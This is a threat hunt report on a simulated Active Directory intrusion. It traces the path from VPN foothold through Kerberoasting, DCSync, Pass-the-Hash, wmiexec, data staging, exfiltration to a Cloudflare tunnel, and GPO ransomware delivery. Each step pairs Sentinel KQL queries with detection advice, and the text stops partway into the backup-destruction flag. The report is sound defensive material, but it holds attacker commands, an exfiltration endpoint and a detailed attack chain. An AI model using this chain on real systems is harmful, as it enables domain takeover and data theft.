<p align="center">
  <img
    src="https://github.com/user-attachments/assets/337bb215-8833-4653-b570-93c443bd9c11"
    width="1200"
    alt="Threat Hunt Cover Image"
  />
</p>

# 🛡️ Threat Hunt Report – Hunt 09: Lateral Descent

---

## 📌 Executive Summary

A threat actor gained initial access to the Greenfield domain via a compromised VPN account, then conducted a full Active Directory compromise culminating in domain-wide ransomware deployment. The attacker progressed from a no-privilege VPN foothold to Domain Admin in four steps — Kerberoasting, offline credential cracking, DCSync, and Pass-the-Hash — before staging a ransomware payload across the estate via Group Policy. All credentials, including the krbtgt account, must be considered burned.

---

## 🎯 Hunt Objectives

- Trace the attacker's full path from initial VPN access to domain-wide ransomware deployment
- Identify credential theft, lateral movement, and persistence mechanisms used
- Map all activity to MITRE ATT&CK techniques
- Document detection gaps and remediation requirements

---

## 🧭 Scope & Environment

- **Environment:** Greenfield domain (`greenfield.local`), Microsoft Sentinel workspace LAW-SilentCorridor
- **Data Sources:** LinuxAuth_CL, SecurityEvent, WindowsProcess_CL, Defender XDR Incident 88471
- **Timeframe:** 2026-06-11 21:54 UTC → 2026-06-12 06:00 UTC
- **Hosts in Scope:** GF-WS01, GF-SRV01, GF-DC01, GF-BKP01, GF-DC02

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1 – Initial VPN Access](#-flag-1--initial-vpn-access)
  - [🚩 Flag 2 – RDP Lateral Movement to Workstation](#-flag-2--rdp-lateral-movement-to-workstation)
  - [🚩 Flag 3 – Scheduled Task Persistence](#-flag-3--scheduled-task-persistence)
  - [🚩 Flag 4 – Host Enumeration](#-flag-4--host-enumeration)
  - [🚩 Flag 5 – Detection Gap: EDR vs SIEM](#-flag-5--detection-gap-edr-vs-siem)
  - [🚩 Flag 6 – Kerberoasting svc_backup](#-flag-6--kerberoasting-svc_backup)
  - [🚩 Flag 7 – Offline Password Cracking](#-flag-7--offline-password-cracking)
  - [🚩 Flag 8 – Replication Rights Abuse](#-flag-8--replication-rights-abuse)
  - [🚩 Flag 9 – DCSync Credential Theft](#-flag-9--dcsync-credential-theft)
  - [🚩 Flag 10 – Pass-the-Hash to Domain Controller](#-flag-10--pass-the-hash-to-domain-controller)
  - [🚩 Flag 11 – krbtgt Hash Acquisition](#-flag-11--krbtgt-hash-acquisition)
  - [🚩 Flag 12 – Remote Execution via wmiexec](#-flag-12--remote-execution-via-wmiexec)
  - [🚩 Flag 13 – Data Collection](#-flag-13--data-collection)
  - [🚩 Flag 14 – Data Exfiltration](#-flag-14--data-exfiltration)
  - [🚩 Flag 15 – Fallback C2 via AnyDesk](#-flag-15--fallback-c2-via-anydesk)
  - [🚩 Flag 16 – GPO Payload Delivery](#-flag-16--gpo-payload-delivery)
  - [🚩 Flag 17 – Backup Destruction](#-flag-17--backup-destruction)
  - [🚩 Flag 18 – Ransomware Staging via Masquerading](#-flag-18--ransomware-staging-via-masquerading)
  - [🚩 Flag 19 – Persistence Model: Group Policy](#-flag-19--persistence-model-group-policy)
  - [🚩 Flag 20 – Trust Boundary Check](#-flag-20--trust-boundary-check)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

The attacker entered the Greenfield environment via a compromised OpenVPN account (`sancadmin`) authenticating from external IP `205.147.16.107`. From the VPN gateway, they pivoted via RDP to workstation GF-WS01 using the `p.singh` account. On the workstation, they conducted automated host enumeration using what appears to be a C2 framework post-exploitation module, then Kerberoasted the `svc_backup` service account — chosen because it was configured with the `Replicating Directory Changes All` right, a legacy permission granted for backup software AD replication.

After cracking `svc_backup`'s RC4-encrypted Kerberos ticket offline, the attacker used those credentials to call DCSync against GF-DC01, extracting every NTLM hash in the domain including `d.williams` (a Domain Admin) and `krbtgt`. They authenticated to the DC as `d.williams` via Pass-the-Hash, then used Impacket's `wmiexec` to operate across the estate. On GF-SRV01, they compressed and exfiltrated three business share folders (`Finance`, `HR`, `Projects`) to an attacker-controlled Cloudflare tunnel endpoint before deploying a ransomware payload (`locker.exe`) domain-wide via a weaponized Group Policy Object linked at `DC=greenfield,DC=local`.

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique | MITRE ID | Priority |
|-----:|-----------|----------|----------|
| 1 | Valid Accounts – VPN Initial Access | T1078 | 🔴 Critical |
| 2 | Remote Services – RDP | T1021.001 | 🔴 Critical |
| 3 | Scheduled Task/Job | T1053.005 | 🟠 High |
| 4 | System Information Discovery | T1082 / T1018 | 🟠 High |
| 5 | Detection Gap – EDR Behavioral vs SIEM Logs | — | 🟡 Medium |
| 6 | Steal or Forge Kerberos Tickets – Kerberoasting | T1558.003 | 🔴 Critical |
| 7 | Brute Force – Password Cracking | T1110.002 | 🔴 Critical |
| 8 | Account Manipulation – Replication Rights | T1098 | 🔴 Critical |
| 9 | OS Credential Dumping – DCSync | T1003.006 | 🔴 Critical |
| 10 | Use Alternate Authentication Material – Pass-the-Hash | T1550.002 | 🔴 Critical |
| 11 | Steal or Forge Kerberos Tickets – Golden Ticket | T1558.001 | 🔴 Critical |
| 12 | System Services – Remote Execution (WMI) | T1047 | 🔴 Critical |
| 13 | Archive Collected Data | T1560 | 🟠 High |
| 14 | Exfiltration Over HTTPS | T1048 | 🔴 Critical |
| 15 | Remote Access Software – AnyDesk | T1219 | 🟠 High |
| 16 | Domain Policy Modification – GPO | T1484.001 | 🔴 Critical |
| 17 | Inhibit System Recovery | T1490 | 🔴 Critical |
| 18 | Masquerading | T1036 | 🟠 High |
| 19 | Domain Policy Modification – Persistence via GPO | T1484.001 | 🔴 Critical |
| 20 | Domain Trust Discovery | T1482 | 🟡 Medium |

---

## 🔍 Flag Analysis

---

<details>
<summary id="-flag-1--initial-vpn-access">🚩 <strong>Flag 1 – Initial VPN Access</strong></summary>

### 🎯 Objective
Identify the initial foothold account and source IP used to authenticate to the OpenVPN gateway.

### 📌 Finding
The account `sancadmin` successfully authenticated to the OpenVPN gateway three times on 2026-06-11 between 21:54–23:45 UTC from external IP `205.147.16.107`. Authentication used PAM unix + Google Authenticator (MFA satisfied), indicating the attacker possessed both the password and the MFA token — suggesting prior credential theft from a cloud environment.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Account | sancadmin |
| Source IP | 205.147.16.107 |
| Timestamps | 21:54, 22:02, 23:45 UTC (2026-06-11) |
| Auth Method | pam_unix + pam_google_authenticator |
| Table | LinuxAuth_CL |

### 💡 Why it matters
This is the entry point for the entire intrusion. The use of MFA-satisfying credentials indicates pre-existing credential compromise, likely from a prior cloud campaign. The sancadmin account had VPN access that provided a path into the internal network.

### 🔧 KQL Query Used

```kql
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-06-11T00:00:00Z) .. datetime(2026-06-12T00:00:00Z))
| project TimeGenerated, TargetUsername, SrcIpAddr, EventOriginalMessage, EventResult
| order by TimeGenerated asc
```

> **Query notes:** LinuxAuth_CL uses the ASIM normalized schema. `TargetUsername` holds the authenticated user, `SrcIpAddr` the source IP. A time-range filter scoped to June 11 was required — without it, the portal default (Last 7 days) returns unrelated current-session data.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on OpenVPN PAM authentications from IPs not seen in the prior 30 days, especially when Google Authenticator is involved (indicates MFA-satisfying token). Correlate VPN auth events with subsequent internal host logons within 30 minutes.

</details>

---

<details>
<summary id="-flag-2--rdp-lateral-movement-to-workstation">🚩 <strong>Flag 2 – RDP Lateral Movement to Workstation</strong></summary>

### 🎯 Objective
Identify which account the attacker used to RDP into GF-WS01 after establishing VPN access.

### 📌 Finding
At 22:02 UTC on 2026-06-11, `p.singh` authenticated to GF-WS01 via RDP (LogonType 10 / RemoteInteractive) from the VPN-internal network. This is the attacker's first move inside the perimeter, pivoting from the VPN gateway to a domain-joined workstation using credentials obtained during the initial foothold phase.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Account | p.singh |
| Target Host | GF-WS01.greenfield.local |
| Logon Type | 10 (RemoteInteractive / RDP) |
| EventID | 4624 |
| Timestamp | ~22:02 UTC (2026-06-11) |
| Table | SecurityEvent |

### 💡 Why it matters
RDP LogonType 10 from a VPN source IP immediately after sancadmin VPN auth confirms the pivot. p.singh becomes the primary operator account for the first phase of the intrusion.

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where Computer contains "GF-WS01"
| where EventID == 4624
| where LogonType == 10
| where not(TargetUserName endswith "$")
| project TimeGenerated, Computer, TargetUserName, IpAddress, LogonType
```

> **Query notes:** LogonType 10 filters specifically for RemoteInteractive (RDP) sessions. Machine accounts (ending in `$`) are excluded to surface only human logons.


### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on EventID 4624 LogonType 10 where the source IP belongs to the VPN subnet. Workstation-to-workstation RDP is rare in most environments; flag it unless explicitly approved.

</details>

---

<details>
<summary id="-flag-3--scheduled-task-persistence">🚩 <strong>Flag 3 – Scheduled Task Persistence</strong></summary>

### 🎯 Objective
Identify the scheduled task created by p.singh on GF-WS01 for SYSTEM-level persistence.

### 📌 Finding
At 23:15 UTC, p.singh created a scheduled task named `GreenfieldUpdate` on GF-WS01 configured to run as SYSTEM. The task executed `cmd.exe /c whoami > C:\Windows\Temp\sys.txt` — a SYSTEM privilege verification step, confirming the attacker had elevated code execution. This same task name later appeared on GF-BKP01, linking the initial foothold to the ransomware deployment phase.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Task Name | GreenfieldUpdate |
| Run As | SYSTEM |
| Command | `cmd.exe /c whoami > C:\Windows\Temp\sys.txt 2>&1` |
| Created By | p.singh / GREENFIELD\p.singh |
| Host | GF-WS01.greenfield.local |
| Timestamp | 23:15:41 UTC (2026-06-11) |
| Table | WindowsProcess_CL |

### 💡 Why it matters
Running as SYSTEM gives the attacker the highest local privilege on the workstation. The task name `GreenfieldUpdate` mimics a legitimate Windows update task — a masquerading technique to blend in with scheduled maintenance. Reuse of this name on GF-BKP01 later in the attack is a campaign fingerprint.

### 🔧 KQL Query Used

```kql
WindowsProcess_CL
| where TimeGenerated between (datetime(2026-06-11T21:00:00Z) .. datetime(2026-06-12T06:00:00Z))
| where DvcHostname contains "GF-WS01"
| where TargetProcessName contains "schtask" or TargetProcessCommandLine contains "schtask"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ActingProcessName
| order by TimeGenerated asc
```

> **Query notes:** WindowsProcess_CL uses ASIM schema — the correct column is `DvcHostname`, not `Computer`. Run `getschema` on the table first if column names are uncertain.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on schtasks.exe with `/ru SYSTEM` and `/create` flags where the ActorUsername is not a machine account. Scheduled tasks created by interactive users running as SYSTEM are almost always malicious.

</details>

---

<details>
<summary id="-flag-4--host-enumeration">🚩 <strong>Flag 4 – Host Enumeration</strong></summary>

### 🎯 Objective
Identify the automated reconnaissance activity performed on GF-WS01 after the initial foothold.

### 📌 Finding
At 22:06–22:28 UTC, p.singh / GF-WS01$/SYSTEM executed a massive automated host survey. The burst included: `whoami /groups`, `whoami /all`, `netstat -abno`, `arp -a`, `schtasks /query /v /fo CSV`, `net localgroup` enumeration, registry reads across all user SIDs (RunMRU, Uninstall, Run keys, Office Addins, startup scripts, services), and `nltest /dclist:greenfield.local`. The millisecond-interval firing across 9 user SIDs per key is the signature of a C2 framework automated host survey module.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Actor | p.singh / NT AUTHORITY\SYSTEM |
| Host | GF-WS01.greenfield.local |
| Timeframe | 22:06–22:28 UTC (2026-06-11) |
| Key Commands | whoami /all, netstat -abno, nltest /dclist:greenfield.local, reg query (mass), net localgroup |
| Tactic | Discovery (T1082, T1018, T1049, T1007, T1057) |
| Table | WindowsProcess_CL |

### 💡 Why it matters
The automated enumeration reveals the attacker's C2 framework capabilities and confirms they were conducting pre-exploitation reconnaissance to identify privilege escalation paths and domain structure. `nltest /dclist:greenfield.local` specifically targeted Domain Controller identification.

### 🔧 KQL Query Used

```kql
WindowsProcess_CL
| where TimeGenerated between (datetime(2026-06-11T21:00:00Z) .. datetime(2026-06-12T06:00:00Z))
| where DvcHostname contains "GF-WS01"
| where TargetProcessCommandLine has_any ("whoami", "netstat", "nltest", "net localgroup", "arp", "reg query", "schtasks /query")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessCommandLine
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on `nltest /dclist` or `nltest /domain_trusts` from workstations. A burst of registry reads across multiple SIDs within a 2-minute window is also a strong indicator of automated post-exploitation tooling.

</details>

---

<details>
<summary id="-flag-5--detection-gap-edr-vs-siem">🚩 <strong>Flag 5 – Detection Gap: EDR vs SIEM</strong></summary>

### 🎯 Objective
Explain why Sentinel had no directory-access records for the host enumeration, and what tool did catch it.

### 📌 Finding
The host enumeration produced no Security Event Log records for directory/registry access because Windows does not audit registry reads by default — no SACL is configured on the queried keys, so no 4663 events fire. Sentinel ingests logs; if the OS doesn't write a record, Sentinel sees nothing. Microsoft Defender for Endpoint caught the activity because it operates at the sensor level on the endpoint, detecting behavioral patterns rather than relying on audit log entries.

### 💡 Why it matters
This is the "two consoles" lesson: a SIEM is only as good as its log sources. Behavioral EDR catches what audit logs miss. Defenders relying solely on Sentinel for host-level activity will have blind spots wherever audit policy is not explicitly configured.

### 🛠️ Detection Recommendation
**Logging Fix:** Enable **Object Access auditing** with SACLs on high-value registry hives (HKLM\SYSTEM, HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run). For a more complete picture, deploy MDE and forward Defender alerts into Sentinel via the M365 Defender connector — both consoles should be used together.

</details>

---

<details>
<summary id="-flag-6--kerberoasting-svc_backup">🚩 <strong>Flag 6 – Kerberoasting svc_backup</strong></summary>

### 🎯 Objective
Identify the service account targeted for Kerberoasting and why it was selected.

### 📌 Finding
The attacker Kerberoasted `svc_backup` — a backup service account with a Service Principal Name registered in AD. A TGS ticket was requested for this account with EncryptionType `0x17` (RC4), which stands out against the AES (0x12) tickets used by every other account in the estate. `svc_backup` was chosen because it had been granted `Replicating Directory Changes All` on the domain root, making its cracked credential more valuable than any ordinary service account.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Target Account | svc_backup |
| Encryption Type | 0x17 (RC4) — outlier vs estate AES |
| EventID | 4769 (Kerberos TGS Request) |
| Why Targeted | Weak by design: SPN registered, RC4 permitted, DC replication rights |
| Tactic | Credential Access (T1558.003) |

### 💡 Why it matters
RC4 tickets are crackable offline at hundreds of millions of attempts per second on modern GPUs. Once cracked, `svc_backup` gave the attacker replication rights to DCSync the entire directory — making this the pivot that turned workstation access into full domain compromise.

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where EventID == 4769
| where TargetUserName contains "svc_backup"
| project TimeGenerated, Computer, TargetUserName, ServiceName, TicketEncryptionType, IpAddress
```


### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on EventID 4769 where `TicketEncryptionType == 0x17` (RC4) and the requested account is not a Domain Controller machine account. In a modern AD with AES enforcement, any RC4 TGS request is anomalous. Enforce `msDS-SupportedEncryptionTypes = 0x18` (AES only) on all service accounts.

</details>

---

<details>
<summary id="-flag-7--offline-password-cracking">🚩 <strong>Flag 7 – Offline Password Cracking</strong></summary>

### 🎯 Objective
Explain what the weak RC4 cipher enables once the ticket is off the network.

### 📌 Finding
The RC4-encrypted TGS ticket is self-contained ciphertext that can be captured and cracked entirely offline. Unlike AES tickets (derived via PBKDF2 with a domain salt), RC4 Kerberos tickets use the account's NT hash directly as the encryption key. Tools like Hashcat can test hundreds of millions of RC4 candidates per second against the captured ticket — with no lockout, no network connection, and no alerts generated on the target domain.

### 💡 Why it matters
This is what separates Kerberoasting from other credential attacks: the attacker takes the ticket blob off-premises and cracks it at leisure. A svc_backup password that hadn't been rotated in years (as is common for service accounts) would fall quickly.

### 🛠️ Detection Recommendation
**Prevention:** Enforce long (25+ character), randomly generated passwords for all service accounts using Group Managed Service Accounts (gMSA) — these rotate automatically and are never crackable via Kerberoasting. Additionally, enforce AES-only (`msDS-SupportedEncryptionTypes`) to prevent RC4 ticket issuance entirely.

</details>

---

<details>
<summary id="-flag-8--replication-rights-abuse">🚩 <strong>Flag 8 – Replication Rights Abuse</strong></summary>

### 🎯 Objective
Identify the AD directory right that made svc_backup worth targeting.

### 📌 Finding
`svc_backup` held the `Replicating Directory Changes All` ACE (`DS-Replication-Get-Changes-All`, GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) on the domain root object. This right allows any account — regardless of group membership — to request AD replication data including password hashes via the MS-DRSR protocol. It was granted to support legacy backup software that required AD replication capability.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Account | svc_backup |
| Right | Replicating Directory Changes All |
| GUID | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 |
| Granted On | DC=greenfield,DC=local (domain root) |
| EventID | 4662 (Directory Service Access) |

### 💡 Why it matters
This is a "weak by design" configuration — not a misconfiguration in the traditional sense, but a dangerous legacy permission. Any account with this right can extract every hash in the domain without being a Domain Admin or touching LSASS.

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where EventID == 4662
| where ObjectType contains "domainDNS"
| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    or Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where not(SubjectUserName endswith "$")
| project TimeGenerated, SubjectUserName, ObjectName, Properties
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Regularly audit ACEs on the domain root object. No non-DC account should hold `DS-Replication-Get-Changes-All`. Use `Get-ObjectAcl` in PowerView or the AD ACL Scanner tool to enumerate replication rights quarterly.

</details>

---

<details>
<summary id="-flag-9--dcsync-credential-theft">🚩 <strong>Flag 9 – DCSync Credential Theft</strong></summary>

### 🎯 Objective
Name the technique used to extract all domain credentials and explain why it left no memory trace on the DC.

### 📌 Finding
The attacker used DCSync — calling `DRSGetNCChanges` via the MS-DRSR (Directory Replication Service Remote Protocol) using svc_backup's credentials. The DC processed the request as a legitimate replication sync, read password hashes from ntds.dit through its own database layer, and returned them over the network. LSASS on the DC was never accessed. No process handle was opened, no memory was read, and no injection occurred — the only artifact was EventID 4662 on the DC.

### 💡 Why it matters
DCSync is the most dangerous credential theft technique in Active Directory environments. It extracts every hash in the domain — including krbtgt — without touching the DC's memory. Traditional LSASS-based detection tools (Sysmon EventID 10, EDR process access monitoring) see nothing.

### 🛠️ Detection Recommendation
**Logging Fix:** Enable Directory Service Access auditing on DCs and alert on EventID 4662 where the `Properties` field contains the replication GUIDs `1131f6aa` or `1131f6ad` AND `SubjectUserName` does not end in `$`. In Sentinel:

```kql
SecurityEvent
| where EventID == 4662
| where Properties has "1131f6aa" or Properties has "1131f6ad"
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, Properties
```

</details>

---

<details>
<summary id="-flag-10--pass-the-hash-to-domain-controller">🚩 <strong>Flag 10 – Pass-the-Hash to Domain Controller</strong></summary>

### 🎯 Objective
Identify which Domain Admin credential was reused and how authentication occurred without the plaintext password.

### 📌 Finding
After DCSync, the attacker used `d.williams`' NTLM hash directly — without cracking it — to authenticate to GF-DC01 as Domain Admin. NTLM's challenge-response mechanism accepts the hash as the secret, so the attacker presented the raw hash via Impacket's Pass-the-Hash capability. The tell in the logs is EventID 4624 on GF-DC01 with `AuthenticationPackageName: NTLM` and `LogonType: 3`, sourced from GF-WS01's IP — a Domain Admin authenticating to a DC via NTLM (rather than Kerberos) from a workstation is anomalous.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Account | d.williams / GREENFIELD\d.williams |
| Target Host | GF-DC01.greenfield.local |
| Auth Package | NTLM (anomalous for DA→DC) |
| Logon Type | 3 (Network) |
| EventID | 4624 |
| Timestamp | ~01:22 UTC (2026-06-12) |

### 💡 Why it matters
Pass-the-Hash requires zero knowledge of the plaintext password. Domain Admins authenticating to DCs via NTLM is a high-fidelity detection signal because Kerberos is the expected protocol for all DA activity in a healthy domain.

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where Computer contains "GF-DC01"
| where EventID == 4624
| where not(TargetUserName endswith "$")
| where LogonType in (3, 9, 10)
| project TimeGenerated, Computer, TargetUserName, IpAddress, LogonType, AuthenticationPackageName
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on EventID 4624 where `AuthenticationPackageName == "NTLM"` and `TargetUserName` is a member of Domain Admins, especially when the source computer is a workstation rather than a server or DC. Enforce Kerberos-only authentication for privileged accounts where possible.

</details>

---

<details>
<summary id="-flag-11--krbtgt-hash-acquisition">🚩 <strong>Flag 11 – krbtgt Hash Acquisition</strong></summary>

### 🎯 Objective
Identify the worst credential in the DCSync haul and why it enables durable domain control.

### 📌 Finding
DCSync retrieved the `krbtgt` account hash — the master key that signs every Kerberos ticket in the domain. With this hash, the attacker can forge Golden Tickets: synthetic TGTs that impersonate any account with any group membership, valid for an attacker-defined period (typically 10 years). Golden Tickets survive password resets of any user account because they only require the krbtgt hash, not the target user's credentials. The only remediation is resetting krbtgt's password twice.

### 💡 Why it matters
krbtgt compromise represents full domain takeover. The attacker can re-enter the domain as any identity at any time, even after all other cleanup, until krbtgt is double-rotated. No other credential in the DCSync haul carries this level of persistence.

### 🛠️ Detection Recommendation
**Hunting Tip:** Golden Ticket detection is difficult at scale. Key signals: Kerberos tickets with unusually long lifetimes (>10 hours), tickets with group memberships that don't match AD, or tickets referencing accounts that don't exist. Microsoft ATA/Defender for Identity has built-in Golden Ticket detection via behavioral analytics.

</details>

---

<details>
<summary id="-flag-12--remote-execution-via-wmiexec">🚩 <strong>Flag 12 – Remote Execution via wmiexec</strong></summary>

### 🎯 Objective
Identify the remote execution tool used on GF-SRV01 and GF-DC01, and the artifact that reveals it.

### 📌 Finding
The attacker used Impacket's `wmiexec.py` for all remote command execution across the estate. The signature artifact is clearly visible in the 5145 share access logs: files named `__1781225160.750315` (timestamp-formatted filename) appearing in `\\*\ADMIN$` (`C:\Windows`). wmiexec redirects command output to a timestamped file in ADMIN$, reads it back over SMB, then deletes it. The two-identity tell is also present: `GF-SRV01$` / `NT AUTHORITY\NETWORK SERVICE` as the wrapper (WmiPrvSE.exe parent) with `d.williams` attributed as the actor.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Tool | Impacket wmiexec.py |
| Artifact | `__1781225160.750315` in ADMIN$ |
| Auth Account | d.williams (Pass-the-Hash) |
| Wrapper Context | NT AUTHORITY\NETWORK SERVICE (WmiPrvSE.exe) |
| Hosts | GF-SRV01, GF-DC01 |
| EventID | 5145 (Network Share Object Checked) |

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where EventID in (5140, 5145)
| where Computer contains "GF-SRV01" or Computer contains "GF-DC01"
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ShareName, ShareLocalPath, RelativeTargetName
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on EventID 5145 where `ShareName == "ADMIN$"` and `RelativeTargetName` matches the pattern `^__\d+\.\d+$`. This is the wmiexec output file signature. Also alert on WmiPrvSE.exe spawning cmd.exe or PowerShell on servers.

</details>

---

<details>
<summary id="-flag-13--data-collection">🚩 <strong>Flag 13 – Data Collection</strong></summary>

### 🎯 Objective
Identify the three business share folders compressed for exfiltration on GF-SRV01.

### 📌 Finding
At 00:51 UTC on 2026-06-12, d.williams (via wmiexec on GF-SRV01) ran:
`Compress-Archive -Path C:\Shares\Finance,C:\Shares\HR,C:\Shares\Projects -DestinationPath C:\Windows\Temp\backup_archive.zip -Force`

Three business-critical share folders were compressed into a single archive staged in `C:\Windows\Temp\` — a writable directory unlikely to trigger file monitoring alerts, disguised within the legitimate Windows temp path.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Folders | C:\Shares\Finance, C:\Shares\HR, C:\Shares\Projects |
| Archive | C:\Windows\Temp\backup_archive.zip |
| Actor | d.williams / GREENFIELD\d.williams |
| Host | GF-SRV01.greenfield.local |
| Timestamp | 00:51:11 UTC (2026-06-12) |
| Command | PowerShell Compress-Archive |

### 💡 Why it matters
Finance, HR, and Projects represent the organization's most sensitive business data. Staging all three in a single archive confirms pre-meditated data theft before ransomware deployment — a double-extortion model.

### 🔧 KQL Query Used

```kql
WindowsProcess_CL
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where TargetProcessCommandLine has_any ("Compress-Archive", "robocopy", "7z", "xcopy", "copy")
| where DvcHostname contains "GF-SRV01"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessCommandLine
| order by TimeGenerated asc
```

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on PowerShell `Compress-Archive` or `7z` targeting multiple share paths in a single command. File staging in `C:\Windows\Temp\` by non-SYSTEM accounts is also a high-signal indicator.

</details>

---

<details>
<summary id="-flag-14--data-exfiltration">🚩 <strong>Flag 14 – Data Exfiltration</strong></summary>

### 🎯 Objective
Identify the exfiltration method and the true destination being masked.

### 📌 Finding
The attacker made multiple attempts to exfiltrate `backup_archive.zip` via HTTPS POST to `https://layout-load-medical-titans.trycloudflare.com/upload`. The first attempt included a custom Host header: `@{'Host'='cdn-backup.abordsecurity.space'}` — masking the true destination behind a Cloudflare tunnel edge node. The Cloudflare URL is the CDN proxy; `cdn-backup.abordsecurity.space` is the attacker's infrastructure. Subsequent retry attempts dropped the custom header (falling back to the Cloudflare URL directly) after the initial attempt, and a final attempt used `curl.exe -k` (skipping TLS verification).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Exfil URL | https://layout-load-medical-titans.trycloudflare.com/upload |
| True Destination | cdn-backup.abordsecurity.space |
| Method | HTTP POST (Invoke-WebRequest, curl.exe) |
| File | C:\Windows\Temp\backup_archive.zip |
| Masking Technique | Host header spoofing via Cloudflare tunnel |
| Timestamps | 00:55–00:59 UTC (2026-06-12) |

### 💡 Why it matters
Cloudflare tunnel URLs (`trycloudflare.com`) are trusted by most proxy and firewall solutions. The Host header reveals the attacker's real C2 domain — without inspecting full HTTP headers, the traffic appears to be legitimate Cloudflare traffic.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on large file POSTs (`-InFile` or `-F` flags with archive file paths) to `*.trycloudflare.com`. Inspect HTTP Host headers on outbound traffic — mismatches between the request URL hostname and the Host header indicate domain fronting or tunnel abuse.

</details>

---

<details>
<summary id="-flag-15--fallback-c2-via-anydesk">🚩 <strong>Flag 15 – Fallback C2 via AnyDesk</strong></summary>

### 🎯 Objective
Identify the fallback remote access tool installed and why a legitimate RMM was preferred over custom malware.

### 📌 Finding
AnyDesk was installed as a fallback C2 channel in case the Cloudflare tunnel was taken down. The attacker chose a legitimate Remote Monitoring and Management tool over custom malware for two reasons: (1) AnyDesk is code-signed by a trusted vendor, so AV/EDR signature and reputation checks pass without detection; (2) AnyDesk traffic uses vendor-owned infrastructure on standard HTTPS ports, which firewall and proxy rules often explicitly allow — making the outbound connection indistinguishable from legitimate remote support sessions.

### 💡 Why it matters
Legitimate RMM tools as backdoors are a standard ransomware actor TTP. The binary is signed, the traffic is expected, and IT teams may not alert on it if AnyDesk is used legitimately elsewhere in the environment.

### 🛠️ Detection Recommendation
**Hunting Tip:** Maintain an approved RMM tool allowlist. Alert on AnyDesk (or any RMM tool) installations that occur outside of change management windows, especially when installed via command line or automated deployment rather than IT's standard package management.

</details>

---

<details>
<summary id="-flag-16--gpo-payload-delivery">🚩 <strong>Flag 16 – GPO Payload Delivery</strong></summary>

### 🎯 Objective
Identify the native AD mechanism abused to push the ransomware payload to every domain-joined machine.

### 📌 Finding
At 01:22 UTC, d.williams accessed SYSVOL on GF-DC01 — specifically the GPO path `greenfield.local\Policies\{A8B9582B-A3D2-4955-ABA2-2EEFA5C9A294}` — reading and writing GPT.INI, Machine, User, and GPO.cmt folders. This confirms the creation or modification of a Group Policy Object. The GPO was linked at `DC=greenfield,DC=local` (the domain root), causing every domain-joined machine to receive and execute the payload at the next Group Policy refresh cycle.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Mechanism | Group Policy Object (GPO) |
| GPO GUID | {A8B9582B-A3D2-4955-ABA2-2EEFA5C9A294} |
| Linked At | DC=greenfield,DC=local (domain root) |
| SYSVOL Path | greenfield.local\Policies\{A8B9582B...} |
| Actor | d.williams |
| Host | GF-DC01.greenfield.local |
| Timestamp | 01:22 UTC (2026-06-12) |

### 💡 Why it matters
GPO linked at the domain root is the most scalable delivery mechanism available to a Domain Admin. Every machine in the domain receives the payload without per-host lateral movement — one action, total estate impact.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on EventID 5136 (Directory Service Object Modified) for GPO objects created or modified outside of change management windows. Also monitor SYSVOL for new files dropped into Policy folders outside of normal admin activity.

</details>

---

<details>
<summary id="-flag-17--backup-destruction">🚩 <strong>Flag 17 – Backup Destruction</strong></summary>

### 🎯 Objective
Identify what the attacker did on the backup server before staging the ransomware.

### 📌 Finding
